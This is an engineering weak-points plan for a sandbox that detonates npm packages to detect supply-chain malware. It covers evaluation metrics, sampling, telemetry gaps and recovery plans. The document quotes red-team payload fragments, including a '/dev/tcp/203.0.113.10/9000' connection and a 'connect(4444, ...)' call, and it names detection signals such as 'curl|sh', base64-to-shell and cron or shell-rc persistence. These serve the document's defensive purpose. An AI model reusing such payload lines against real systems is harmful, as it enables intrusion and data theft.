# Known weak points, and the plan for each

**Written 2026-11-02 at `8419f58`.** Every entry has a *binary* acceptance test, a rollback, and
a gate saying whether it should be attempted before the **Nov 4, 9:00 pm ET** deadline. Several
say "don't do this now" on purpose: the working demo is worth more than an unvalidated fix.

**Rule for this document:** nothing moves from "planned" to "done" without the acceptance
evidence pasted into its row. A passing test suite is not acceptance evidence for anything that
touches the Chamber or a live check.

| # | Weak point | Severity | Gate |
|---|---|---|---|
| W1 | No demo video | **Highest** (25% of score, lowest-scoring category) | Before |
| W2 | `m12` verdict is a coin flip | High (our headline number) | Ships **off**; 3 of 4 conditions now measured |
| W3 | 6 of 104 benign unverifiable | Medium | **Characterized & defended Nov 3** (offline, coverage unchanged); rebuild still After |
| W4 | Grounding metric narrower than it sounds | Medium (we overstated it) | **(a) wording done Nov 3; (b) checker extended, swept over all committed telemetry, one false-positive class closed Nov 3** |
| W5 | `rt08` open miss | Medium | After |
| W6 | Single Chamber VM, no tested restore | Medium — **Nov 4: drill demonstrated** — an AMI-launched instance detonated with `pre_seen==true`; only EIP-reassociation over pinned TLS remains a console step | Before |
| W7 | Reconciler deployed but never fired | Medium | Before |
| W8 | Sandbox egress is open TCP | Medium (honestly documented) | **Allowlist validated live on a sacrificial replica Nov 4** — exfil refused, 0 benign regression; still off the judged Chamber |
| W9 | Private-repo path never exercised | Low–Medium | Before (cheap) |
| W10 | Modal token not rotated | Medium | Before (1 min) |
| W11 | Disclosed package unfixed; name in git history | Medium (ethical) | Ongoing |
| W12 | Red-team set is not blind | Medium (claim hygiene) | After |
| W13 | One path where a model decision can clear a rule hit | Medium (claim hygiene) | **Closed in code Nov 3** |
| W14 | `git config` / `.git/hooks` are an untraced attack surface | Medium (found by the held-out set) | **git-config half closed in rules Nov 3** (0/742 FP); `.git/hooks` write gated |
| W15 | DNS encoded-label rule has a length floor a short label evades | Low–Medium (found by the held-out set) | **Closed in code Nov 3** (0/742 FP) |

---

## W1 — No demo video

**Why it matters.** Demo is 25% of the reported weighting and the audits' lowest category
(7.1/10). Everything built in the last two days sits in categories already scoring 8.6–9.2, so
this is the only item with multiple points of headroom left.

**Plan.** Film against a pre-flighted stack: re-run the four demo PRs, confirm all four
conclusions, then record in one take per `demo/DEMO_SCRIPT.md`. The script now ends on a live
`brain.sbom diff` that needs no network, so the last beat can't fail on camera.

**Acceptance.** A ≤3-minute video that (a) plays in a logged-out browser, (b) shows real GitHub
check conclusions on the same SHAs we claim, (c) states one limitation aloud, and (d) has its
URL pasted into `docs/SUBMISSION.md` and opened once from a private window.

**Rollback.** Keep the previous take. If live checks are slow, show the already-completed run on
the same PR (already in the script's fallbacks).

**Gate: before the deadline. This is the one item that should displace other work.**

---

## W2 — `m12`'s verdict is a coin flip

**Why it matters.** `m12-domain-exfil` exfiltrates to an ordinary *resolvable* domain, which the
rules can only rate LOW. Its outcome depends on whether Muse returns `malicious` (HIGH) or
`suspicious` (LOW) on a given call: measured **Blocked ×3, Needs review ×2** over five trials.
So "16/16 attacks blocked" is true in 3 of 5 runs, and a judge re-running us may see 15/16.

**Plan — best-of-N escalation.** `brain/verdict.py` computes
`level = max(rule_level, model_level, extra_level)`: model output can only *raise* severity.
That makes sampling monotone — taking the **max over N samples** can never clear something a
single call would have blocked, so it is safe by construction rather than by tuning. Add
`MODEL_SAMPLES` (default 1, so nothing changes until deliberately raised), call the analysis N
times concurrently, and combine with `max`.

**The tradeoff this creates, which must be measured and not assumed.** The same monotonicity
that stabilises attacks also makes benign ⚠️ *more* likely: if the model says `suspicious` on
`cypress` 1 time in 5, then max-of-3 surfaces that most of the time. This buys attack stability
with benign review noise, and the exchange rate is unknown until measured.

**Acceptance (all four, or it is not adopted).**
1. `eval/repeat.py --arms sampled --trials 5` shows **flip rate 0** on the 18 attack cases.
2. Benign ⚠️ in the `sampled` arm rises by **no more than 2** of 104 versus the `full` arm.
3. Benign **Blocked stays 0** in every trial.
4. Cost per PR stays under **$0.04** (N=3 is roughly 3 analysis calls plus one prediction).

**Rollback.** `MODEL_SAMPLES = 1` restores today's behaviour exactly; it is one constant.

**Gate: before the deadline *only* if acceptance 1–4 all pass on a measured run.** Otherwise
keep N=1 and keep quoting the distribution — which is already honest and already published.
Do **not** ship this on the assumption it helps.

### Measured, round 1: unconditional N=3 — rejected on cost

Quality passed and the feared tradeoff did not appear. Acceptance 2 came back **zero**: no
benign case moved in the stricter direction at all (`prisma` Clean ×5, the three ⚠️ packages ⚠️
×5).

| | `full` (N=1) | `sampled` (worst of 3) |
|---|---|---|
| Flip rate | 1/42 (`m12`) | **0/42** |
| Attacks mergeable, worst trial | 2/38 | **1/38** (`rt08` only) |
| Benign Blocked, any trial | 0/4 | **0/4** |
| Benign made stricter | — | **0** |

**Acceptance 4 failed: $0.045–$0.054 per PR against the $0.04 budget.** That budget was
pre-registered, so it binds — rejected rather than rewritten.

### Round 2: re-sample only in the borderline band

The flip only *matters* where another sample could still change what the reviewer is told.
`BORDERLINE_TITLES = ("Needs review", "Could not verify")`; `Blocked` cannot be improved on
(`combine` takes a max) and `Clean` is excluded because that is 67.6% of cases and measured
perfectly stable across 42 × 5 × 2 trials.

Priced on the scored 142: **9 in band (6.3%)**, so worst-case **$0.0212/PR** against the $0.04
budget (upper bound — it charges each band member 2× its *whole-pipeline* cost, and only the
analysis call repeats). Unconditional N=3 was $0.0544 for comparison. **Acceptance 4 passes.**

**Band bug found by the round-2 measurement.** `gm08-cpu-miner` flipped Blocked ×4 / Could not
verify ×1 in the `sampled` arm. Not a sampling regression: its install **timed out**, so
`verified` is permanently False and `combine` can never title it "Needs review" — the first
version of the band silently excluded it and all **7 unverified cases of 142** from re-sampling.
That trial was plain N=1 variance. Hence "Could not verify" is in the band.

**The new tradeoff this widening creates, pre-registered before the re-run.** All 6 benign
`Could not verify` cases (native-build packages) now get 3× the chance of drawing a `malicious`
sample. Both titles are already a `failure` conclusion, so the **merge gate does not move**
either way; what moves is the label. For `gm08` that is a correction (it really is a miner); for
a benign native build an escalation to Blocked would be a false accusation.

**Acceptance for the widened band.** Acceptance 3 still binds: **benign Blocked must stay 0**.
If a benign case escalates, narrow the band to unverified cases *that already carry a rule hit*
rather than keeping the wider version — do not relax condition 3.

### Verdict: W2 ships **off**. `MODEL_SAMPLES = 1`.

The re-run of the widened band was **abandoned unmeasured**. It ran 80 minutes against an
expected ~20 (4 established HTTPS connections, 6 s of CPU — provider-side throttling, almost
certainly from the extra concurrent samples), and was killed under the 2× rule rather than left
to burn API spend.

So acceptance **1 and 3 are unmeasured for the widened band**, and the gate is explicit that all
four must pass on a measured run. Therefore the default stays 1 and sampling is off in
production. Shipping it would mean flipping a verdict-affecting default, hours before filming, on
the strength of a measurement I could not obtain — which is precisely what the standing trade at
the bottom of this document warns against.

What is actually in the repo: the mechanism, the band, 8 tests including the `gm08` and
`Clean`-exclusion cases, and a priced cost model. All of it inert at `MODEL_SAMPLES = 1`. The
honest public claim is unchanged and already published — *`m12` is Blocked in 3 of 5 trials, and
we quote the distribution rather than the best run.*

**If anyone resumes this:** re-run `--arms full,sampled` with `max_workers=1` in
`eval/repeat.py` to avoid the throttling, and check condition 3 first — the 6 benign
`Could not verify` native-build packages are the ones at risk from the widening.

### Nov 3: three of the four conditions recovered from the recorded trials, free

`eval/band_sim.py` reconstructs the widened band from the two arms already committed in
`eval/REPEAT_W2.json` (42 cases × 5 trials), without another API call. The band draws one
sample and re-samples only when that sample's verdict is borderline, so per trial it is
`sampled[i] if full[i] in BORDERLINE_TITLES else full[i]`.

| | `full` (N=1) | `sampled` (worst of 3) | **band (reconstructed)** |
|---|---|---|---|
| Attack flips | 1/38 (`m12`) | 1/38 (`gm08`) | **0/38** |
| Attacks mergeable, worst trial | 2/38 | 1/38 | **1/38** (`rt08` only) |
| Benign Blocked, any trial | 0/4 | 0/4 | **0/4** |

The band is better than *both* recorded arms on flip rate, and it settles the case W2 exists
for: `m12-domain-exfil` goes from Blocked ×4 / Needs review ×1 to **Blocked ×5**. It also avoids
`gm08`'s flip, which the unconditional arm had, because `gm08` is Blocked at N=1 and so is never
re-sampled.

**One part is a proof rather than an estimate.** The band either keeps the single sample's
verdict or raises it with `max`, so no attack can become *more* mergeable than at N=1 — for any
N, on any corpus, independent of these trials. Acceptance 1's safety direction holds by
construction, and a test checks it against the data as well.

**What this is not.** The two arms were scored as separate runs, so `full[i]` is an independent
draw rather than literally the first of `sampled[i]`'s three. It is a Monte Carlo estimate over
5 trials, which cannot distinguish a flip rate of 0 from a few percent. Evidence toward
acceptance 1, not the measured run the gate asks for.

### Nov 3: acceptance 3 measured, with the real band code

The 6 at-risk packages were absent from the 42-case corpus, so they were run on their own —
`eval/REPEAT_W2_NATIVE.{json,md}`, stamped clean at `8057a42`, 5 trials, `sampled` arm, 120
model calls for about **$1.50** rather than the $25 a full re-score costs.

| Package | Outcome across 5 trials |
|---|---|
| `better-sqlite3`, `argon2`, `cpu-features`, `node-pty`, `biome`, `cypress` | `Could not verify` ×5 — **0 Blocked, 0 flips** |

This is a measurement of the **widened band itself**, not of unconditional N=3: at this commit
`brain/sampling.py::sample_analysis` draws one sample and re-samples only when `needs_more`
fires, and `pipeline.analyze` passes the `BORDERLINE_TITLES` predicate. The abandoned round-2
run is therefore no longer wholly missing.

**And the population acceptance 2 and 3 have to cover is 10, not 104.** The band cannot touch a
case whose first sample is not borderline — it returns that sample unchanged, which
`tests/test_sampling.py::test_clean_is_never_resampled_because_that_is_where_the_volume_is` and
`test_no_resample_when_the_first_answer_is_not_borderline` pin in code. So the 94 benign cases
that read Clean at N=1 are unaffected *by construction*, and the only benign cases the band can
reach are the 4 at ⚠️ and the 6 unverified. Both groups are now measured:

| Benign group | Measured | Result |
|---|---|---|
| 4 at ⚠️ (`puppeteer`, `playwright-chromium`, `chromedriver`, `prisma`) | round 1 | ⚠️ ×5, **0 Blocked** |
| 6 unverified native builds | Nov 3 | `Could not verify` ×5, **0 Blocked** |
| 94 Clean at N=1 | not needed | never re-sampled, by construction |

Residual, stated rather than glossed: a benign case that normally reads Clean but *occasionally*
draws a borderline first sample would enter the band on that trial. That path is unmeasured for
the 94. It is second-order — the same case can already draw a bad sample at N=1 — but it is not
nothing.

### Verdict: W2 still ships **off**, `MODEL_SAMPLES = 1`.

What is measured: acceptance **2**, **3** (for every benign case the band can reach) and **4**
(priced at $0.0212/PR worst case against the $0.04 budget).

What is not: **acceptance 1**, flip rate 0 on the attack cases, *with the band code*. The 0/38
figure above is a reconstruction from recorded arms plus the monotonicity proof — strong, but the
gate asks for a measured run and says so for a reason. Closing it is one more targeted run, since
a Blocked case never re-samples and so costs a single analysis call:

```powershell
python -m eval.repeat <telemetry-dir> --trials 5 --arms sampled --workers 1 `
  --only m01-...,m16-...,r01-ua-parser-js,r02-shai-hulud --out eval/REPEAT_W2_ATTACKS
```

≈190 calls, **≈$2.50** for the 18 malicious + incident cases. Until then the default stays 1,
and `tests/test_band_sim.py` asserts it, so nobody can mistake three conditions plus a proof for
four conditions measured.

---

## W3 — 6 of 104 benign packages cannot be verified

**Why it matters.** `better-sqlite3`, `argon2`, `cpu-features` and `node-pty` exit 1 because
`chamber/sandbox/Dockerfile` is `node:20-slim` plus curl/wget/netcat/git/python3 — **there is no
C toolchain**, so `node-gyp` cannot build. `biome` and `cypress` hit the install timeout. That
is ~6% of mainstream packages on which we return no answer.

**The timeout half is not a fixed rate (measured Nov 3).** Re-detonating all 104 benign controls
a day later, `biome` completed in **5.8 s** and `cypress` in **40 s** — both well inside the
240 s limit they had exceeded on Nov 2. So that run's 6 was 4 the next day, and the two timeout
cases are a registry/CDN speed artifact rather than a property of the sandbox. The four native
builds failed identically both times, which is the real, reproducible half of this entry. The
stamped `eval/results.json` is deliberately left at the Nov 2 figures; see
[`eval/PERSISTENCE.md`](../eval/PERSISTENCE.md) for the re-run it came from.

**Plan.** Two independent changes, measured separately:
- **(a) Toolchain.** Add `build-essential` (and `pkg-config`) to the sandbox image, rebuild, and
  re-run the 104 benign set.
- **(b) Timeout.** Raise the default install timeout from its current value to 300 s for the
  eval only, and re-run `biome` and `cypress`.

**The security tradeoff, stated plainly.** Putting a compiler in the sandbox hands every payload
a compiler. It widens what an attacker can do *inside* the blast radius — build a binary from
source instead of downloading one, which also removes the network signal we currently rely on
for `EXEC_DROPPED_BINARY`. That is a real reduction in our detection surface, not just an image
size cost. It may be the right trade for coverage, but it must be a decision, not a drift.

**Acceptance.**
1. The four native packages reach `exit 0` and score ✅, taking benign to 99–100 clean.
2. **No benign package that was ✅ becomes ⚠️ or ❌** — checked case by case, not in aggregate.
3. All 16 attacks and both incidents still block, re-scored on freshly detonated telemetry.
4. A new red-team case that *compiles* its payload locally is added, and the eval reports
   honestly whether we still catch it. If we don't, that is a new disclosed gap.

**Rollback.** Revert the Dockerfile and rebuild; the image is rebuilt from source each time, so
there is no state to unwind.

**Gate: after judging.** It changes the image every number in the eval was measured on, and
acceptance 4 could *open* a gap we would then have to disclose mid-submission.

### Characterized & defended, Nov 3 — offline, coverage unchanged

The rebuild above is still **after judging**. What was done now is the safe, report-only half:
turn the open "6 cannot be verified" into a precisely-accounted-for, deliberate posture. **No
image change, no re-score, no verdict moved** — coverage is exactly the stamped numbers.

**The six, split by cause** (from the committed `eval/results.json` fields):

- **Four native-build failures — reproducible, by design.** `better-sqlite3`, `argon2`,
  `node-pty`, `cpu-features` each `status: completed, exit_code: 1`. Three fetch Node headers
  from `nodejs.org` — the `node-gyp` configure step — then the build step fails because the slim
  image has `python3` but **no `cc`/`g++`/`make`**. The node-gyp path itself is committed as
  telemetry in `eval/validation_telemetry/v02-node-gyp-build.json` (exec chain
  `sh -c "node-gyp rebuild"` → `gyp_main.py`, with the `gyp ERR!` stderr tail). Failed identically
  on Nov 2 and Nov 3.
- **Two CDN-speed timeouts — an artifact, not a sandbox property.** `biome` and `cypress` hit the
  240 s timeout on Nov 2 and completed in **5.8 s** and **40 s** on the Nov 3 re-run
  (`eval/PERSISTENCE.md`). Neither touches the toolchain.

So the six are **4 unsupported-toolchain + 2 CDN-timeout + 0 genuine failures**, every one
accounted for.

**The compiler tradeoff, now quantified rather than asserted.** Adding `build-essential` hands
every payload a compiler, and a local compile-from-source produces a native artifact with **no
fetch, no connection, no dropped-binary exec** — defeating `EXEC_DROPPED_BINARY` (the central
one: it needs a binary that *arrived over the network* and is run from a drop dir) plus
`EXEC_NET_TOOL`, `NET_RAW_IP`, `NET_UNLISTED_DOMAIN`, `NET_EXFIL_SERVICE`, the DNS witness, and
(secondarily) the `RES_CPU_HEAVY` build-tool exemption, which a present compiler makes reachable
to launder a miner as a build. Full enumeration and the decision memo:
[`eval/TOOLCHAIN_TRADEOFF.md`](../eval/TOOLCHAIN_TRADEOFF.md).

**Recommendation (adopted): keep the no-compiler default and reclassify the four native cases as a
by-design `unsupported-toolchain` outcome — a deliberately smaller blast radius, not a failure to
verify.** The honest statement, all six covered, is: *98/104 verified; 4 require a C toolchain we
deliberately exclude for a smaller blast radius; 2 were CDN-speed timeouts that pass on re-run; 0
blocked.* `eval/toolchain.py` (report-only, pinned by `tests/test_toolchain.py`) produces this
split mechanically from telemetry and cannot change any verdict.

**Coverage is unchanged.** This did not raise verification to 100%; it made the existing limitation
fully accounted-for and the compiler tradeoff measured. The rebuild remains the gated, after-judging
decision.

---

## W4 — The grounding metric is narrower than "452/452" sounds

**Why it matters.** I reported *"452/452 claims supported, 0% unsupported"* without the caveat.
`brain/evidence.py` checks (a) entries in `key_evidence`, which must cite an event id of the
right type, and (b) a regex for hostnames/IPs in the prose. A false claim in prose that is not a
host — *"it appended to `~/.bashrc`"* when nothing did — is **not** caught. So the number mostly
measures **citation discipline**, not total factual accuracy.

**Plan.**
- **(a) Wording, now.** Every place that number appears says what it covers and what it does
  not. Mandatory regardless of anything else — it is a correction, not an improvement.
- **(b) Checker, later.** Extend `evidence.py` to extract additional checkable claim classes
  from prose — absolute file paths, package names, process/binary names, port numbers — and
  verify each against the index and corpus, reporting an *uncited factual claim* rate alongside
  the existing one.

**Acceptance for (b).** On the 142-case eval, the extended checker produces a non-trivial
uncited-claim count (if it reports 0 for everything, it is not actually checking anything), and
hand-auditing 10 random supported claims against the raw telemetry finds no false positives.
Verdicts must remain unchanged: this is measurement, never control.

**Rollback.** (a) is text. (b) is report-only by construction and can be deleted.

**Gate: (a) before the deadline — do it today. (b) after judging.**

### (a) was only three-quarters done — completed Nov 3

The prose documents carried the caveat. Four **generated** eval summaries published the figure
bare: `eval/results.md`, `eval/REPEAT.md`, `eval/REPEAT_CORE.md` and `eval/REPEAT_W2.md`.
`eval/results.md` is the first file a reviewer checking the numbers would open, and it said
"0% unsupported-claim rate" with no statement of what the rate covers — exactly the overstatement
this entry exists to prevent, in the one place it mattered most.

Fixed at the source: the caveat is now `brain/evidence.py::GROUNDING_CAVEAT`, next to the code
that computes the metric, and both `eval/run_brain.py` and `eval/repeat.py` emit it, so a re-run
cannot drop it. The committed copies were updated to match. `tests/test_docs_match_eval.py`
asserts that **every** document publishing a grounding ratio also states what it measures and
what it excludes — seven documents, checked by phrase so rewording is allowed and deletion is
not. Mutation-tested 5/5.

Writing that test also found that the connective varies between documents ("not", "not as",
"rather than total factual accuracy") and that `README.md` writes the ratio as "452 of 452"
rather than "452/452" — which my first version of the check silently *skipped* instead of
verifying. Both are now handled; a skip would have left the most-read document unguarded.

### Measured: (b) does not pass its own acceptance, and the acceptance is why

Implemented for file paths and ports. Over the 420 analyses recorded by the W2 repeat run it
fired on **33**, which looked like the "non-trivial count" the acceptance asked for. It was not:
hand-auditing the hits found **every one a false positive**, from two bugs.

1. **Ports written without a colon.** The check asked whether `:9000` appeared in the corpus.
   Source code does not write ports that way — `rt09` has `/dev/tcp/203.0.113.10/9000` and
   `rt10` has `connect(4444, "203.0.113.10")`. Both ports were plainly on record and the model
   described them accurately; the checker called the model unsupported.
2. **Duplicate reporting.** The dedup test compared a bare port against labels of the form
   `"port 9000"`, so a port named twice in one paragraph was listed twice.

Both fixed, with the real corpus lines pinned as test cases. A port now counts as on record if
the number appears anywhere in the corpus as its own number. That is deliberately loose: a
missed catch is far cheaper here than telling a reviewer that a true statement was unsupported.

**After the fix it fires on nothing** (8 inspected calls across `rt06`, `rt09`, `rt10`). So the
acceptance condition "produces a non-trivial count" now **fails**, and the honest reading is:

> On these cases the model does not assert file paths or ports that are absent from the record.
> The check is a **regression guard**, not a detector that has found a real hallucination.

That is a weaker claim than the commit that added it implied, and it is the claim the docs now
make. The acceptance condition earned its keep: without it I would have shipped a check whose
only output was 33 false accusations against our own model.

### Swept over all committed telemetry Nov 3 — one more false-positive class, now closed

The earlier "fires on nothing" was 8 inspected calls across three cases. Re-running the check
across **every committed grounding summary** (822 analyses in `eval/results.json`,
`eval/REPEAT*.json`, `eval/blind_model_arm.json`) widens that. Only the runs stamped *after* the
uncited check was added carry its field at all — the blind set (10), `REPEAT_W2` (420) and
`REPEAT_W2_NATIVE` (30), 460 analyses — and the raw per-case model prose was never committed, so
this is a sweep of the recorded counts, not a live re-score (a full re-score is the $25 the gates
forbid pre-judging).

What the sweep found:

- **`REPEAT_W2`: 42 uncited fires — the pre-fix port bug above.** That run was stamped at
  `4167bb0`, *before* the port fix `d8a3d81`, so its counts are the colon-port false positives
  already dissected (`rt06`, `rt09`, `rt10`, `gm04`, `gm09`). Historical, not a current result.
- **The blind corpus: exactly one fire, `bc09-path-shadow`, and it is a false positive too.**
  This is the one uncited fire in the *post*-fix committed telemetry. Hand-audited against
  `eval/blind_telemetry/bc09-path-shadow.json`: the payload builds its git-shim path with
  `path.join(os.homedir(), ".local", "bin")` then `path.join(bin, "git")`, so `~/.local/bin/git`
  **never appears as one contiguous string** in the corpus even though every segment is quoted
  right there in the script. The model read the source and named the real path; the check accused
  it of inventing it — the same "source assembles the value in pieces" root cause as the port
  bug, one data type over. A second, smaller cause showed up beside it: a path ending a sentence
  (`~/.bashrc.`) kept the trailing period, which is not in the corpus, so an on-record path read
  as invented.
- **Host/IP mentions (the W4(a) half): 4 fires across the 792 analyses that ran it**, all on
  benign browser-download packages (`puppeteer`, `playwright-chromium`) in a minority of trials,
  naming a CDN download host that was not literally in that trial's corpus. Benign model phrasing
  variance, not a hallucinated destination.

**Fix (report-only, same loose philosophy).** A path now counts as on record when every segment
of its tail is a *token* in the corpus (not only when the whole path is one substring), and a
trailing sentence punctuation is stripped before the check. `bc09`'s correct descriptions stop
being flagged; a path whose distinctive segment is simply absent — a claimed
`~/.ssh/authorized_keys` the record never touched — is still flagged. Mutation-tested 4/4 (drop
the punctuation strip; `all`→`any`; segment check always true; token-match → substring-match).
After the fix the check fires on **nothing** across the committed telemetry.

**Proving it still fires (the acceptance's other half).** A `0` on honest output is the intended
regression-guard result, but a check that returns `0` on an actual falsehood is not checking
anything. `tests/test_evidence.py::test_planted_false_prose_is_flagged_for_both_a_path_and_a_port`
plants a verdict claiming it wrote `~/.bashrc` and used `port 4444` against a record containing
neither, and asserts both are caught and the verdict is untouched.

**Decision on the remaining candidate classes — not added, by design.** The plan listed
"package names" and "process/binary names". Both are declined, and the reason is the philosophy,
not effort:

- They are not reliably *extractable* from prose. A back-ticked token is as often a function, a
  flag, a filename or a code fragment as an executed binary, and package/binary names are
  ordinary words (`color`, `helper`, `node`, `git`). There is no pattern that isolates "a binary
  the model claims ran" without sweeping in honest prose.
- The model legitimately names binaries and packages it reasons about *from the diff* that never
  executed (`source_inferred` evidence). Flagging those is precisely "telling a reviewer a true
  statement was unsupported", the one outcome this check exists to avoid.
- Decisively, it could not be *measured*: the 142-case model prose was never persisted, so a new
  class cannot be scored on the committed eval, and a live re-score is the spend the gates hold
  back. Shipping an unmeasured, false-positive-prone class is exactly what these gates prevent.

So the checked classes stay **file paths, ports, hostnames and IPs** — the concrete identifiers
that either appear in the corpus or demonstrably do not. The honest status is unchanged from the
line above and now holds against a wider sweep: a **regression guard**, with its two measured
false-positive classes (ports, paths) both closed, and no real hallucination to its name.

---

## W5 — `rt08` is an open miss, and CPU time cannot close it

**Why it matters.** A bare inline CPU loop leaves no exec, connect or file trace. Measured
today: rt08 burns **8.16 s** while eight benign packages burn more (playwright-chromium 26.0,
prisma 25.1, puppeteer 21.3, …), so no threshold separates them, and the build-tool exemption
does not help because those packages download prebuilt binaries rather than invoking a compiler.

**Plan — require a second signal, pre-registered before looking at results.**
Candidate signals, cheapest first: (1) **syscall profile** — a mining loop does almost no
syscalls per CPU-second, whereas a compiler does constant file I/O; (2) **process lifetime vs
work** — a detached child still burning CPU after the install's main process exits; (3)
**absence of progress artifacts** — real builds write object files.

**Candidate (1) was tested on the v3 telemetry and is insufficient as currently measurable.**
Using observable events per CPU-second as a proxy for syscall density:

| case | ev/cpu_s |
|---|---|
| `gm08-cpu-miner` (detached) | 0.19 |
| prisma | 0.48 |
| puppeteer | 0.52 |
| playwright-chromium | 0.69 |
| **`rt08-local-miner` (inline)** | **0.74** |

A threshold at rt08's density also flags prisma, puppeteer and playwright-chromium. The cause is
specific and fixable: **`file_events` only covers decoy and bait paths, not general file I/O**,
so a compiler's constant writes are invisible to us and a package unpacking a browser looks as
quiet as a miner. We are not measuring the quantity that would separate them. (It does separate
`gm08` cleanly at 0.19, but the model already catches gm08.)

So candidate (1) is only viable *after* recording a real work signal — a syscall counter, or
general `openat`/`write` counts rather than decoy-path matches. That is a meaningful telemetry
volume and noise increase and needs its own cap and benchmark, which is why it is not a
pre-deadline change. Candidates (2) and (3) remain untested and are now the cheaper next step,
since both can be derived from data we already collect.

**Acceptance.** A pre-registered holdout of ≥10 CPU-heavy benign cases (node-gyp builds, wasm
builds, large minification, image processing) and ≥5 safe mining stand-ins, built *before* any
threshold is chosen. Signal must separate them with **zero** benign hard blocks and ≤1 benign
⚠️, and the rule must stay LOW. If it cannot, record the negative result and leave rt08 open.

**Rollback.** The rule ships disabled behind a constant, like `CPU_REVIEW_THRESHOLD_S`.

**Gate: after judging.** `rt08` stays a reported miss, which is already in the write-up.

### Nov 3: the gap is now measured, and it is telemetry, not rules

With the raw telemetry pulled off the Chamber (`docs/HANDOFF.md` §6) and re-scored offline by
`eval/score_rules.py`, the rules-level misses are no longer a guess. Ten attack cases are not
Blocked by rules alone, and they fall into three groups:

| Why the rules miss it | Cases | What would close it |
|---|---|---|
| The payload writes a file, and only *bait* paths are traced | `gm04`, `rt06` (`~/.bashrc`) — **closed Nov 3: policy deployed, rule at HIGH, both now Blocked**; `gm10`, `rt07` (sibling package tamper) still open | `persistence-files.yaml` did the first two; a write-only filter with a volume benchmark for the others |
| Tetragon traces `tcp_connect`, not `bind`/`listen` | `gm09` (backdoor listener) | A `listen`/`bind` tracing policy — but see the note below: this case binds loopback only |
| CPU only, or nothing observable at all | `rt08`, `gm08` (miners), `rt10` (dormant by design) | W5 above; `rt10` has nothing to see and is correctly model-caught |
| Observable, and now caught | `gm05` (cron injection) | **Done** — `EXEC_SCHEDULED_PERSISTENCE` |

**`m12-domain-exfil` stays model-caught deliberately.** Its payload sends a dummy body, so it
never touches the decoy credentials; from telemetry alone a `POST` to `example.com` is
indistinguishable from a benign telemetry ping. A rule here would be fitted to the test case
rather than to the behaviour, so it was not written.

So four of the ten misses share **one** root cause: `file_events` covers only the planted bait
credential files. That is the same cause W5 identifies for the miner gap ("a compiler's constant
writes are invisible to us"), which makes file-write telemetry the highest-value single change
available.

### Nov 3: half of it is done, and the half that is left is a volume problem

The four cases split cleanly, and only one half is safe to do without measurement:

**Done — deployed and measured, Nov 3.** `chamber/policies/persistence-files.yaml` traces opens
of shell startup files, cron spools and systemd units — the paths `gm04` and `rt06` append to. It
reuses `security_file_open` and the same single `file` argument as the credential policy already
running on the Chamber, so **no new Tetragon JSON shape** is involved. It is a *separate* policy
rather than extra prefixes on the credential one, so deploying was additive and rollback does not
disturb credential tracing. `FILE_PERSISTENCE` classifies those paths, with `CRED_FILE_ACCESS`
left for the bait files — a `.bashrc` is not "a planted fake credential", and the old code would
have said so.

It shipped at **LOW** first, because a rule that cannot fire yet has no false-positive evidence
at all, and blocking on an unmeasured signal is what these gates exist to prevent. It is now at
**HIGH**, earned: full write-up in [`eval/PERSISTENCE.md`](../eval/PERSISTENCE.md).

| | Result |
|---|---|
| Benign controls opening a persistence path | **0 of 104** (re-detonated live with the policy loaded) |
| Runs with truncated telemetry | **0 of 106** |
| `gm04-rcfile-persist` | no rule fired → **Blocked** (`~/.bashrc` + `~/.zshrc`) |
| `rt06-persist-rcfile` | no rule fired → **Blocked** (`~/.bashrc`) |

Validity was checked before the result: npm reads `~/.npmrc` on every install, so every traced
record carries a file event — 0 of 104 lacked one, 0 had a blind collector, 0 failed the sensor
witness. "0 of 104" therefore means nothing opened these paths, not that tracing was dead.

Two honest notes. The policy is **host-global**, so host shell startups reading
`/etc/bash.bashrc` post events too (7 observed, all `/bin/bash` outside any container, from SSH
logins) — filtered by the Chamber's parser, negligible against the 200 MB export budget. And two
benign verdicts differ from the stamped eval, **neither caused by this rule**: `biome` and
`cypress` had hit the 240 s timeout on Nov 2 and completed on Nov 3, which makes W3's "6 could
not verify" a property of that run rather than a fixed rate — see W3.

**Still open: sibling-package tampering (`gm10`, `rt07`).** These rewrite a file inside a
*different* `node_modules` package. Tracing that needs writes under `/work/node_modules/`, which
npm writes constantly — a `Prefix` selector there would report thousands of events per install,
flood the cap, and because truncation fails closed, turn every verdict into "Could not verify".
Closing it needs a write-only filter (not `security_file_open`, which fires on reads too) plus a
volume benchmark, and a discriminator for the legitimate case: a postinstall script writing into
its *own* package directory is normal, into a sibling's is not. The kernel-recorded `cwd` that
`brain/pinpoint.py` already uses for attribution is the right basis. That is a genuine piece of
work, not a prefix edit, and it stays gated.

**`gm09`'s listener is also weaker than its label.** It binds `127.0.0.1:31337` — loopback only,
unreachable from outside the sandbox. Catching it needs `bind`/`listen` tracing, but the case as
written does not demonstrate a reachable backdoor, so it is not the strongest motivation for
that work.

### `EXEC_SCHEDULED_PERSISTENCE`, added Nov 3

Five candidate signals were measured against **3342 exec events across 742 recorded installs**
(the 142 eval cases plus the 100- and 500-package registry sweeps; 604 of those are uncurated
packages straight off the npm feed) *before* any was written:

| Candidate | Attacks | Benign (104) | Uncurated (604) | Decision |
|---|---|---|---|---|
| cron / systemd / `at` | 1 | **0** | **0** | **Shipped** (HIGH) |
| `chmod +x` | 0 | 0 | **2** | Rejected — real packages do this |
| `curl\|sh`, `wget\|sh` | 3 | 0 | 0 | No new catch: all three already Block |
| base64 → shell | 1 | 0 | 0 | Already covered by `EXEC_DECODE_PIPE` |
| `~/.bashrc`, `authorized_keys`, `nohup`, `LD_PRELOAD`, history tampering | **0** | 0 | 0 | No signal — those payloads use node's `fs` API, so argv cannot see them |

Verdict impact, measured rather than argued: **exactly one case moves**, `gm05-cron-inject`
Clean → Blocked at the rules level. Its `full` verdict was already Blocked, so **no published
figure changes**. Recorded as the single entry in `eval/score_rules.py::KNOWN_DRIFT`, which
fails if an unexplained disagreement with the stamped eval appears *or* if a listed one
disappears. Mutation-tested 11/11.

The first version of the pattern was too loose — a plain `\bcrontab\b` also matches
`docs/crontab-format.md`, which a package shipping cron documentation would ship. Its own test
caught that before it shipped; the pattern now matches only in command position.

---

## W6 — Single Chamber VM with no tested restore

**Why it matters.** One EC2 box runs Tetragon, dnsmasq, the egress rules and the Chamber API,
one job at a time. If it dies the day before or during judging, every check becomes
"Could not verify" (correctly — which is to say, the demo is gone). There is no AMI snapshot and
no rehearsed rebuild. This is the highest *operational* risk left.

**Plan.**
1. Snapshot the running instance to an AMI (console or `aws ec2 create-image`).
2. Write `docs/CHAMBER_RECOVERY.md`: launch from AMI, reattach the Elastic IP (or update
   `CHAMBER_URL` in the `chamber` Modal secret), confirm the pinned TLS cert still matches what
